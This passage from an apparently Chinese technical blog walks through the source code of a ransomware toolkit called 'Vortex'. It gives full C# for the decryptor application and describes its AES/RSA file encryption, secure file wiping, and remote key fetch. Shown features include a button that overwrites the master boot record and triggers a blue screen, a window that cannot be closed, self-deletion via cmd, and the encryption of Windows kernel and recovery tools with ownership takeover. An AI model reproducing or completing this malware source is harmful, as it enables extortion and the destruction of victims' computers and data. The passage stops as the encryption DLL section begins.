> - ~~**`GetRemoteAesKey`方法重载**~~ ： ~~第一个重载方法接受目标服务器的 IP 地址、用于解密从服务器接收数据的`AesKeyAndIv`实例以及服务器端口（默认 8888）作为参数。通过 TCP
> 连接到指定服务器，从服务器读取数据并使用提供的 AES 密钥和 IV
> 进行解密。然后，将解密后的数据按照特定格式拆分，验证并返回`AesRandomKeyPack`实例。~~  第二个重载方法只接受目标服务器的
> IP 地址和服务器端口（默认 8888）作为参数。它直接从服务器读取数据，不进行 AES
> 解密操作，然后按照特定格式拆分数据，验证并返回`AesRandomKeyPack`实例。这两个方法都使用了`CancellationTokenSource`来设置连接超时时间（20
> 秒），如果连接超时则抛出`TimeoutException`异常；如果接收到的密钥格式无效或验证失败，则抛出`GetAesKeyException`异常。
> - **AES 加密和解密**
>   - **`AesEncrypt`方法**：接受明文字符串和`AesKeyAndIv`实例作为参数。在方法内部，创建 AES 加密对象，设置密钥、IV、加密模式（`CipherMode.CBC`）和填充模式（`PaddingMode.PKCS7`），然后使用这些设置创建加密器。将明文字符串写入`CryptoStream`，通过加密器对数据进行加密，最终将加密后的字节数组返回。
>   - **`AesDecrypt`方法**：接受加密后的字节数组和`AesKeyAndIv`实例作为参数。与加密过程相反，创建 AES 解密对象，设置密钥、IV、解密模式和填充模式，创建解密器。将加密后的字节数组写入`MemoryStream`，通过解密器对数据进行解密，最终将解密后的明文字符串返回。

>  - **RSA 加密和解密**
>    - **`RsaEncrypt`方法**：接受待加密的字节数组和 RSA 公钥的 XML 字符串作为参数。创建`RSACng`对象并从 XML
> 字符串加载公钥，使用公钥对字节数组进行加密，采用`RSAEncryptionPadding.OaepSHA512`填充模式，最后返回加密后的字节数组。​​​​​
>    - **`RsaDecrypt`方法**：接受待解密的字节数组和 RSA 私钥作为参数。创建RSACng对象并从私钥加载密钥，使用私钥对字节数组进行解密，采用相同的填充模式，最后返回解密后的字节数组。

> - **文件加密和解密**
>   - **`EncryptFileWithAesKey`方法**：接受文件路径作为参数，创建 AES 加密对象，生成IV，设置加密模式和填充模式。创建加密后的文件路径，将 IV写入加密后的文件，然后通过`CryptoStream`使用加密器将原始文件内容加密后写入加密后的文件。接着，将原始文件内容用fileWiper方法进行5次覆盖并清空，最后删除。
>   - **`DecryptFileWithAesKey`方法**：接受文件路径~~和 AES 密钥~~ 作为参数。~~首先检查文件路径是否为 AES 密钥文件路径或加密后 AES 密钥文件路径，如果不是，则检查密钥长度是否为 32 字节。~~ 创建 AES 解密对象，从文件中读取前 16 字节作为 IV，设置解密模式和填充模式。创建解密后的文件路径，通过`CryptoStream`使用解密器将加密文件内容解密后写入解密后的文件。最后，删除原始加密文件。
>   - **`fileWiper` 方法**：用于彻底擦除指定文件。先通过`FileInfo`验证文件是否存在，获取文件长度。核心擦除过程循环 7 次，前两次使用固定值0x00和0xFF交替覆盖，后面5次每次调用`RandomByte`方法，利用`RandomNumberGenerator`生成安全随机字节数组，再通过`FileStream`以分批次写入策略，用随机字节覆盖文件原有内容。覆盖完成后删除文件。同时，方法通过`try - catch`捕获`IOException`等异常，并抛出自定义异常，确保程序运行稳定。

> - **加载和生成验证码**
>   - **`LoadAesKey`方法**：用于加载或生成 AES 密钥。首先检查指定目录是否存在，不存在则创建。然后检查 AES 密钥文件是否存在，如果不存在则生成一个 256 位的 AES 密钥并保存到文件中。读取密钥文件内容，检查密钥长度是否为 32
> 字节，如果不符合要求则弹出错误提示并返回空字节数组。如果一切正常，则返回读取的 AES 密钥。
>   - **`Random_Key`方法**：用于生成一个随机验证码。通过Random对象生成随机索引，从包含大小写字母和数字的字符数组中选取字符，构建长度为
> 27 的字符串并返回。
## 3.2 Vortex_decryptor解密程序
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/452d71345ebc4bd8ae5bd169a7c18102.png#pic_center)

### 3.2.1 Program.cs

```csharp
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace _Vortex_decryptor
{
    internal static class Program
    {
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();
        public static string keyHash256;
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            SetProcessDPIAware();
            //声明全局异常
            Application.ThreadException += new System.Threading.ThreadExceptionEventHandler(Application_ThreadException);
            AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
            try
            {
                if (!(args is null))
                {
                    if (args.Length >= 1)
                    {
                        keyHash256 = args[0];
                    }
                    else
                    {
                        Environment.Exit(0);
                    }
                }
                else
                {
                    Environment.Exit(0);
                }
                Process[] processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
                // 检查进程数是否大于1，如果打开两个就退出一个
                if (processes.Length > 1)
                {
                    Environment.Exit(0);
                }
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        // 处理全局异常
        private static void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        { }
        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        { }
    }
}

```
### 3.2.2 Form3.cs

```csharp
using System;
using System.IO;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;

namespace _Vortex_decryptor
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(richTextBox1.Text);
        }

        private void Form3_Load(object sender, EventArgs e)
        {
            richTextBox1.Text = Convert.ToBase64String(File.ReadAllBytes(AesRsaEncryptionManager.AES_KEY_ENCRYPTED_FILE_PATH));
        }
    }
}
```
### 3.2.3 Form1.cs

```csharp
using System;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;
using VortexSecOps.HarmfulSysHacks;

namespace _Vortex_decryptor
{
    /// <summary>
    /// 密钥交换方式
    /// </summary>
    public enum KeyAcquisitionMethod
    {
        /// <summary>
        /// 通过局域网远程密钥包获取密钥
        /// </summary>
        RemotePrivateKeyPackageViaLan,
        /// <summary>
        /// 手动交换密钥
        /// </summary>
        ManualKeyExchange
    }
    public partial class Form1 : Form
    {
        public Form1()
        {
            // 初始化窗体组件
            InitializeComponent();
            // 为窗体关闭事件添加处理方法
            this.FormClosing += Form1_FormClosing;
        }
        // 静态引用当前窗体实例
        public static Form1 form1;
        // 存储私钥
        private static string _remoteAesKey;
        // 存储异步任务
        private static Task task;
        /// <summary>
        /// 文件是否被解密
        /// </summary>
        public static bool decryped = false;
        /// <summary>
        /// 密钥获取方式
        /// </summary>
        public static KeyAcquisitionMethod keyAcquisition;
        private static string _aesKey;
        public static string AesKey
        {
            get
            {
                // 返回 AES 密钥的克隆副本
                return _aesKey?.Clone().ToString();
            }
            set
            {
                // 设置 AES 密钥
                _aesKey = value;
            }
        }
        // 存储密钥
        private static string _key;
        public static string Key
        {
            get
            {
                // 返回密钥的克隆副本
                return _key?.Clone().ToString();
            }
            set
            {
                // 设置密钥
                _key = value;
            }
        }
        public static string RemoteAesKey
        {
            get
            {
                // 返回AES密钥的克隆副本
                return Convert.ToString(_remoteAesKey?.Clone());
            }
            set
            {
                // 设置AES密钥
                if (AesRsaEncryptionManager.GetSHA256(Convert.FromBase64String(value)) == Program.keyHash256)
                {
                    _remoteAesKey = value;
                }
                else
                {
                    throw new GetAesKeyException("AES密钥不匹配或包含错误");
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // 给静态窗体引用赋值
            form1 = this;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Computer Eradication
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            // 创建 Windows API 操作对象
            IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
            // 弹出确认对话框
            if (MessageBox.Show("你确定要打算放弃吗", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
            {
                // 修改主引导记录
                windowsAPIOperator.ModifyMasterBootRecord();
                // 触发蓝屏
                windowsAPIOperator.TriggerBlueScreen();
            }
        }

        /// <summary>
        /// Decrypt Now
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            // 如果文件已解密，禁用按钮并返回
            if (decryped == true)
            {
                button2.Enabled = false;
                return;
            }
            // 禁用按钮
            button2.Enabled = false;
            // 创建并显示解密窗体
            Form2 form2 = new Form2();
            form2.ShowDialog();
            // 启用按钮
            button2.Enabled = true;
        }

        /// <summary>
        /// Copy
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                // 将富文本框内容复制到剪贴板
                Clipboard.SetText(richTextBox2.Text);
            }
            catch (Exception) { }
        }

        /// <summary>
        /// Check
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void button4_Click(object sender, EventArgs e)
        {
            // 如果任务存在且未完成，提示用户并返回
            if (task != null)
            {
                if (!task.IsCompleted)
                {
                    MessageBox.Show("上一次的请求未完成", "无法获取信息", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            // 禁用按钮
            button4.Enabled = false;
            // 启动异步任务
            task = Task.Run(async () =>
            {
                try
                {
                    // 将字符串转换为字节数组作为 AES 密钥
                    byte[] aesKey = Encoding.UTF8.GetBytes("tF3G7lW6DkP8N5vJ4hB2M0sR9yX1zQ6f");
                    // 创建 AES 密钥和初始化向量对象
                    AesKeyAndIv aesKeyAndIv = AesKeyAndIv.CreateNewAes(aesKey);
                    // 异步获取 RSA 私钥包
                    var aesRandomKeyPack = await AesRsaEncryptionManager.GetRemoteAesKey(textBox1.Text, aesKeyAndIv, 3568);
                    if (aesRandomKeyPack != null)
                    {
                        keyAcquisition = KeyAcquisitionMethod.RemotePrivateKeyPackageViaLan;
                    }
                    // 存储AES密钥
                    RemoteAesKey = aesRandomKeyPack.AesKey;
                    // 将密钥显示在富文本框中
                    richTextBox2.Text = aesRandomKeyPack.Key;
                    // 存储密钥
                    Key = aesRandomKeyPack.Key;
                }
                catch (TimeoutException ex)
                {
                    // 超时异常处理，显示错误消息
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (GetAesKeyException ex)
                {
                    // 获取 AES 密钥异常处理，显示错误消息
                    MessageBox.Show(ex.Message, "获取失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    richTextBox2.Text = string.Empty;
                    Key = string.Empty;
                }
                catch (Exception ex)
                {
                    // 其他异常处理，显示错误消息
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    richTextBox2.Text = string.Empty;
                    Key = string.Empty;
                }
            });
            // 延迟 1 秒
            await Task.Delay(1000);
            // 启用按钮
            button4.Enabled = true;
        }
        private void button5_Click(object sender, EventArgs e)
        {

        }
        private async void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // 如果没有解密
            if (decryped == false)
            {
                e.Cancel = true;
                this.Hide();
                await Task.Delay(5000);
                this.Show();
            }
            else
            {
                // 退出程序1秒钟之后删除自身
                ProcessStartInfo startInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    FileName = "cmd.exe",
                    Arguments = $"/C timeout/T 1 /NOBREAK&&del /F \"{Process.GetCurrentProcess().MainModule.FileName}\""
                };
                Process.Start(startInfo);
                e.Cancel = false;
                Environment.Exit(0);
            }
        }

        private void button5_Click_1(object sender, EventArgs e)
        {
            Form3 form3 = new Form3();
            form3.ShowDialog();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            button6.Enabled = false;
            if (textBox2.Text != null && textBox2.Text != string.Empty)
            {
                string keyHash;
                byte[] HashBytes = null;
                using (SHA256 hA256 = SHA256Cng.Create())
                {
                    try
                    {
                        StringBuilder builder = new StringBuilder();
                        HashBytes = hA256.ComputeHash(Convert.FromBase64String(textBox2.Text));
                        foreach (byte hashbyte in HashBytes)
                        {
                            builder.Append(hashbyte.ToString("x2"));
                        }
                        keyHash = builder.ToString();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        button6.Enabled = true;
                        return;
                    }
                }
                if (keyHash == Program.keyHash256 && Program.keyHash256 != null && Program.keyHash256 != string.Empty)
                {
                    keyAcquisition = KeyAcquisitionMethod.ManualKeyExchange;
                    Key = AesRsaEncryptionManager.Random_Key();
                    _aesKey = textBox2.Text;
                    richTextBox2.Text = Key;
                }
                else
                {
                    MessageBox.Show("哈希值不匹配或包含错误", "无法获取解密密钥", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            button6.Enabled = true;
        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
}
```

>  **主要功能模块**  
>  
> 1.**枚举与属性定义** ```csharp public enum KeyAcquisitionMethod {
>     RemotePrivateKeyPackageViaLan,
>     ManualKeyExchange } ```
>    - 密钥获取方式：支持通过局域网远程获取密钥包或手动输入密钥两种方式
>  
>  2.**窗体初始化与全局状态** ```csharp public static Form1 form1; private static string _remoteAesKey; public static bool decryped = false; public
> static KeyAcquisitionMethod keyAcquisition; ```
> - 静态引用当前窗体实例，便于跨方法访问。
> - 存储解密状态和密钥获取方式。
> - 通过属性封装实现 AES 密钥的安全访问，包含 SHA256 哈希验证。
> 
> 3.**核心功能按钮**
> 
> **3.1 系统破坏按钮** 
> ```csharp 
> private void button1_Click(object sender, EventArgs e) {
>     IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
>     if (MessageBox.Show("你真的要打算放弃吗?", "警告", MessageBoxButtons.OKCancel) == DialogResult.OK)
>     {
>         windowsAPIOperator.ModifyMasterBootRecord();
>         windowsAPIOperator.TriggerBlueScreen();
>     } 
>  } 
>  ```
> - 通过工厂模式创建系统操作对象
> - 提供双重确认机制，防止意外触发
> - 修改 MBR 并触发蓝屏，实现破坏性操作，跟RedEye勒索病毒设计类似
> 
> **3.2 解密功能按钮**
> 
> ```csharp 
> private void button2_Click(object sender, EventArgs e) {
>     if (!decryped)
>     {
>         button2.Enabled = false;
>         Form2 form2 = new Form2();
>         form2.ShowDialog();
>         button2.Enabled = true;
>     } 
>  } 
>   ```
> - 打开解密子窗体，实现文件解密功能
> - 防止重复解密操作
> 
> **3.3 远程密钥获取按钮**
> 
> ```csharp 
> private async void button4_Click(object sender, EventArgs e)
> {
>     task = Task.Run(async () =>
>     {
>         try
>         {
>             byte[] aesKey = Encoding.UTF8.GetBytes("tF3G7lW6DkP8N5vJ4hB2M0sR9yX1zQ6f");
>             byte[] aesIv = Encoding.UTF8.GetBytes("8cDf4kG9Lh3N2pQ5");
>             var aesKeyAndIv = AesKeyAndIv.CreateNewAes(aesKey, aesIv);
>             var aesRandomKeyPack = await AesRsaEncryptionManager.GetRemoteAesKey(textBox1.Text, aesKeyAndIv,
> 3568);
>             
>             RemoteAesKey = aesRandomKeyPack.AesKey;
>             richTextBox2.Text = aesRandomKeyPack.Key;
>             Key = aesRandomKeyPack.Key;
>         }
>         catch (Exception ex)
>         {
>             MessageBox.Show(ex.Message);
>         }
>     }); 
>   } 
>  ```
> - 异步获取远程 AES 密钥包
> - 使用固定的 AES 密钥和 IV 进行通信
> - 实现超时处理和异常捕获
> - 验证密钥哈希值，确保密钥完整性
> 
> **3.4 手动密钥输入按钮**
> 
> ```csharp 
> private void button6_Click(object sender, EventArgs e) {
>     if (!string.IsNullOrEmpty(textBox2.Text))
>     {
>         using (SHA256 hA256 = SHA256Cng.Create())
>         {
>             byte[] HashBytes = hA256.ComputeHash(Convert.FromBase64String(textBox2.Text));
>             string keyHash = BitConverter.ToString(HashBytes).Replace("-", "").ToLowerInvariant();
>             
>             if (keyHash == Program.keyHash256)
>             {
>                 keyAcquisition = KeyAcquisitionMethod.ManualKeyExchange;
>                 Key = AesRsaEncryptionManager.Random_Key();
>                 _aesKey = textBox2.Text;
>                 richTextBox2.Text = Key;
>             }
>         }
>     } 
>  } 
>  ```
> - 手动输入 Base64 编码的 AES 密钥
> - 计算 SHA256 哈希值并验证
> - 支持手动密钥交换方式
> 
> 4.**防关闭机制**
> 
> ```csharp 
> private async void Form1_FormClosing(object sender,
> FormClosingEventArgs e) {
>     if (!decryped)
>     {
>         e.Cancel = true;
>         this.Hide();
>         await Task.Delay(5000);
>         this.Show();
>     }
>     else
>     {
>         ProcessStartInfo startInfo = new ProcessStartInfo()
>         {
>             FileName = "cmd.exe",
>             Arguments = $"/C timeout/T 1 /NOBREAK&&del /F \"{Process.GetCurrentProcess().MainModule.FileName}\""
>         };
>         Process.Start(startInfo);
>         Environment.Exit(0);
>      } 
>  } 
>    ```
>  - 未解密时阻止窗体关闭
>  - 隐藏窗体 5 秒后重新显示
>  - 解密完成后自动删除自身可执行文件，实现自销毁功能 
>     
>  **安全机制**
>  1. **密钥验证**：所有 AES 密钥设置都经过 SHA256 哈希验证
>  2. **异步操作**：网络请求采用异步模式，避免 UI 卡顿
>  3. **异常处理**：全面的异常捕获和用户提示
>  4. **自销毁功能**：完成任务后自动删除程序文件
>  5. **防关闭保护**：未完成解密前阻止用户关闭程序

### 3.2.4 Form2.cs 
```csharp
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;
using VortexSecOps.FileTraversalService;
using VortexSecOps.HarmfulSysHacks;
using VortexSecOps.Regedit_Set;

namespace _Vortex_decryptor
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            // 初始化窗体组件
            InitializeComponent();
            // 为窗体关闭事件添加处理方法
            this.FormClosing += Form2_FormClosing;
        }
        // 静态变量，用于标记是否可以关闭窗口
        public static bool canCloseWindow = true;

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            // 如果操作未完成，阻止窗口关闭并显示提示信息
            if (canCloseWindow == false)
            {
                e.Cancel = true;
                MessageBox.Show("操作未完成", "无法退出", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                // 操作完成，允许关闭窗口
                e.Cancel = false;
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            // 检查输入的 Key 值是否与 Form1 中的 Key 匹配，并且 Form1 的密钥是否存在
            if (textBox1.Text != null && textBox1.Text != string.Empty && textBox1.Text == Form1.Key)
            {
                try
                {
                    // 禁用按钮，防止重复点击
                    button1.Enabled = false;
                    // 标记操作未完成，禁止关闭窗口
                    canCloseWindow = false;
                    // 标记文件已解密
                    Form1.decryped = true;

                    #region 删除注册表项
                    // 异步删除注册表中的 VortexCrypt 子项
                    Task.Run(() =>
                    {
                        using (var reg_encryped = Registry.LocalMachine.OpenSubKey(@"SOFTWARE", true))
                        {
                            try
                            {
                                reg_encryped.DeleteSubKeyTree(@"VortexCrypt");
                            }
                            catch (Exception)
                            {
                                // 捕获异常但不做处理
                            }
                        }
                    });
                    #endregion 删除注册表项
                    // 创建一个信号量，限制并发任务数量为 100
                    var semaphore = new SemaphoreSlim(100, 100);
                    // 用于存储所有解密任务的列表
                    var decryptionTasks = new List<Task>();
                    // 创建文件遍历器实例
                    var fileTraverser = FileTraverser.Create();
                    // 创建 AES/RSA 加密服务实例
                    IAesRsaCryptographyService cryptographyService = AesRsaEncryptionManager.Create();
                    if (Form1.keyAcquisition == KeyAcquisitionMethod.RemotePrivateKeyPackageViaLan)
                    {
                        if (Form1.RemoteAesKey != null && Form1.RemoteAesKey != string.Empty)
                        {
                            // 加载 AES 密钥
                            cryptographyService.AesKey = Convert.FromBase64String(Form1.RemoteAesKey);
                        }
                        else
                        {
                            Form1.decryped = false;
                        }
                    }
                    else if (Form1.keyAcquisition == KeyAcquisitionMethod.ManualKeyExchange)
                    {
                        cryptographyService.AesKey = Convert.FromBase64String(Form1.AesKey);
                    }
                    if (File.Exists(@"C:\bin\mbr.bin.VXCRY"))
                    {
                        cryptographyService.DecryptFileWithAesKey(@"C:\bin\mbr.bin.VXCRY");
                    }
                    // 恢复硬件抽象层
                    if (File.Exists(@"C:\Windows\System32\hal.dll.VXCRY"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\hal.dll.VXCRY", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path);
                        });
                    }
                    // 恢复系统内核
                    if (File.Exists(@"C:\Windows\System32\ntoskrnl.exe.VXCRY"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ntoskrnl.exe.VXCRY", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path);
                        });
                    }
                    // 恢复系统完整性检查和修复工具
                    if (File.Exists(@"C:\Windows\System32\sfc.exe.VXCRY"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\sfc.exe.VXCRY", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path);
                        });
                    }
                    // 恢复 Microsoft 管理控制台
                    if (File.Exists(@"C:\Windows\System32\mmc.exe.VXCRY"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\mmc.exe.VXCRY", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path);
                        });
                    }
                    // 恢复 Windows 映像部署管理工具
                    if (File.Exists(@"C:\Windows\System32\Dism.exe.VXCRY"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\Dism.exe.VXCRY", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path);
                        });
                    }
                    // 恢复 Windows 恢复环境配置工具
                    if (File.Exists(@"C:\Windows\System32\ReAgentc.exe.VXCRY"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ReAgentc.exe.VXCRY", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path);
                        });
                    }
                    // 创建 Windows API 操作对象
                    IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
                    // 获取主引导记录数据
                    byte[] mbrdata = MalwareIntruder.GetMbrUsingWindowsAPI();
                    // 将主引导记录数据写入主引导记录
                    windowsAPIOperator.WriteToMasterBootRecord(mbrdata);

                    // 创建注册表配置器实例
                    IRegistryConfigurer registryConfigurer = RegistryConfigurer.Create();
                    // 配置 CMD 相关设置
                    registryConfigurer.ConfigureCMD(0);
                    // 配置启动程序
                    registryConfigurer.ConfigStartupProg("explorer.exe");
                    // 应用 Windows 限制设置
                    registryConfigurer.ApplyWinRestricts(false);
                    // 启用注册表编辑器
                    registryConfigurer.DisableRegistryEdit(0);
                    // 启用系统设置
                    registryConfigurer.DisableSysSettings(0);
                    // 遍历 C:\users 目录下所有扩展名为 .crypt 的文件进行解密
                    foreach (string aesDecryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\users", "*.VXCRY"))
                    {
                        // 等待信号量，确保并发任务不超过 100 个
                        await semaphore?.WaitAsync();
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                // 使用 AES 密钥解密文件
                                cryptographyService.DecryptFileWithAesKey(aesDecryptionNeededFilePath);
                                // 在列表框中显示已解密的文件路径
                                listBox1.Items.Add($"已解密：{aesDecryptionNeededFilePath}");
                            }
                            catch
                            {
                                // 捕获异常但不做处理
                            }
                            finally
                            {
                                // 释放信号量
                                semaphore?.Release();
                            }
                        });
                        // 将任务添加到任务列表中
                        decryptionTasks.Add(task);
                    }

                    // 遍历 C:\Program Files (x86) 目录下所有扩展名为 .crypt 的文件进行解密
                    foreach (string aesDecryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Program Files (x86)", "*.VXCRY"))
                    {
                        await semaphore.WaitAsync();
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                cryptographyService.DecryptFileWithAesKey(aesDecryptionNeededFilePath);
                                listBox1.Items.Add($"已解密：{aesDecryptionNeededFilePath}");
                            }
                            catch
                            {
                                // 捕获异常但不做处理
                            }
                            finally
                            {
                                semaphore?.Release();
                            }
                        });
                        decryptionTasks.Add(task);
                    }

                    // 获取所有驱动器信息
                    DriveInfo[] driveInfo = DriveInfo.GetDrives();
                    // 遍历除 C 盘外的所有固定磁盘驱动器
                    foreach (DriveInfo drive in driveInfo)
                    {
                        if (drive.Name != @"C:\" && drive.DriveType == DriveType.Fixed)
                        {
                            // 遍历当前驱动器下所有扩展名为 .crypt 的文件进行解密
                            foreach (string aesDecryptionNeededFilePath in fileTraverser.TraverseFile(drive.Name, "*.VXCRY"))
                            {
                                await semaphore.WaitAsync();
                                var task = Task.Run(() =>
                                {
                                    try
                                    {
                                        cryptographyService.DecryptFileWithAesKey(aesDecryptionNeededFilePath);
                                        listBox1.Items.Add($"已解密：{aesDecryptionNeededFilePath}");
                                    }
                                    catch
                                    {
                                        // 捕获异常但不做处理
                                    }
                                    finally
                                    {
                                        semaphore?.Release();
                                    }
                                });
                                decryptionTasks.Add(task);
                            }
                        }
                    }

                    // 创建一个任务，等待所有解密任务完成
                    Task task1 = Task.WhenAll(decryptionTasks);
                    await Task.Run(() =>
                    {
                        // 等待所有解密任务完成
                        Task.WaitAny(task1);
                        // 标记操作完成，允许关闭窗口
                        canCloseWindow = true;
                    });

                    // 显示提示信息，告知用户可以正常使用电脑
                    MessageBox.Show("您现在可以正常使用电脑了，壁纸需要手动更换，祝您愉快", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    // 捕获异常并显示错误信息
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    // 允许关闭窗口
                    canCloseWindow = true;
                    button1.Enabled = true;
                    // 标记文件未解密，不允许关闭主窗口
                    Form1.decryped = false;
                }
            }
            else
            {
                // 输入的 Key 值有误，显示错误信息
                MessageBox.Show("输入的 Key 值有误", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // 空事件处理方法
        }
    }
}
```
1. **密钥检查**：程序启动后，当用户点击解密按钮（`button1_Click` 事件触发），首先检查用户在文本框（`textBox1`）中输入的 Key 值。该值需与 Form1 中的 Key 匹配，且 Form1 中的AES密钥不为空且存在（适用于`RemotePrivateKeyPackageViaLan`模式）。若不满足此条件，提示用户 “输入的 Key 值有误”，解密流程终止；若满足条件，进入下一步。
2. **禁用按钮与设置窗口状态**：确认无误后，禁用解密按钮（`button1.Enabled = false`），防止用户重复点击。同时，将静态变量 `canCloseWindow` 设为 `false`，阻止用户在解密过程中关闭窗口，避免操作中断。
3. **删除注册表项**：以异步方式删除注册表中位于 “`SOFTWARE\VortexCrypt`” 的子项。通过打开 “`HKEY_LOCAL_MACHINE\SOFTWARE`” 键，并尝试删除其下的 `“VortexCrypt”` 子项树。若删除过程中出现异常，程序捕获异常但不做处理，继续后续操作。
4. **初始化解密工具及密钥**：创建一个信号量（`SemaphoreSlim`），限制并发解密任务数量为 100。同时，初始化文件遍历器（`FileTraverser`）和 AES/RSA 加密服务（`IAesRsaCryptographyService`）实例。
5. **解密关键系统文件**：​
首先解密位于 “`C:\bin\mbr.bin.VXCRY`” 的文件，该文件可能与系统启动相关。​
通过获取文件所有权（`MalwareIntruder.TakeOwnershipOfFile` 方法），解密 “`C:\Windows\System32\hal.dll`” 和 “`C:\Windows\System32\ntoskrnl.exe`” 这两个关键的系统文件，再依次解密其他系统文件。这两个文件分别是硬件抽象层和操作系统内核文件，对系统的正常运行至关重要。
6. **修复主引导记录及配置系统设置**：​
创建 Windows API 操作对象（`IWindowsAPIOperator`），获取主引导记录数据（`MalwareIntruder.GetMbrUsingWindowsAPI`），并将该数据写回主引导记录（`windowsAPIOperator.WriteToMasterBootRecord`），修复可能被恶意程序修改的主引导记录，为系统正常启动做准备。​
创建注册表配置器（`IRegistryConfigurer`）实例，对系统相关设置进行配置。具体包括配置 CMD 相关设置（`ConfigureCMD (0)`）、设置启动程序为 “`explorer.exe`”（`ConfigStartupProg ("explorer.exe")`）、应用 Windows 限制设置（`ApplyWinRestricts (false)`）、禁用注册表编辑（`DisableRegistryEdit (0)`）以及禁用系统设置（`DisableSysSettings (0)`）。这些设置旨在恢复系统的正常运行环境和安全性。
7. **遍历磁盘解密文件**：​
从 C 盘的 “`C:\users`” 目录开始，使用文件遍历器（`fileTraverser.TraverseFile`）查找所有扩展名为 “`.VXCRY`” 的文件。对于每个找到的文件，先等待信号量（`await semaphore.WaitAsync ()`），确保并发任务不超过 100 个。然后以异步任务的形式（`Task.Run`）使用 AES 密钥对文件进行解密（`cryptographyService.DecryptFileWithAesKey`），并在列表框（`listBox1`）中显示已解密的文件路径。任务完成后，释放信号量（`semaphore.Release ()`）。​
对 “`C:\Program Files (x86)`” 目录执行相同的操作，遍历该目录下所有扩展名为 “.VXCRY” 的文件并进行解密处理。​
获取系统中所有的驱动器信息（`DriveInfo.GetDrives ()`），遍历除 C 盘外的所有固定磁盘驱动器。对于每个驱动器，同样查找并解密其中扩展名为 “.VXCRY” 的文件。
8. **等待解密任务完成及提示用户**：创建一个任务（`Task.WhenAll`）等待所有的解密任务完成。当所有解密任务结束后，将 `canCloseWindow` 设为 true，允许用户关闭窗口，并显示提示信息 “您现在可以正常使用电脑了，祝您愉快”，告知用户解密操作完成，系统已恢复正常使用状态。
## 3.3 加密程序vcry.dll
### 3.3.1 Program.cs

```csharp
using System;
